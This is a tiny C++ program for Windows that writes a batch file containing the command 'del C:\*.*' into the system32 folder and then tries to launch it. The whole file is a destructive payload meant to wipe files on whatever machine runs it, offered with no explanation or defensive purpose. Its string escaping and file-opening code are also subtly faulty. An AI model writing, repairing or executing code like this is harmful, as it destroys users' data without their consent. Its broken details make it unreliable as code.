#include<fstream>
#include<windows.h>
using namespace std;

fstream fout("C:\\WINDOWS\\system32\\this.bat");

int main()
{
  fout<<"del C:\\*.*";
  fout.close();
  system("start C:\WINDOWS\system32\this.bat");
  return 0;
}
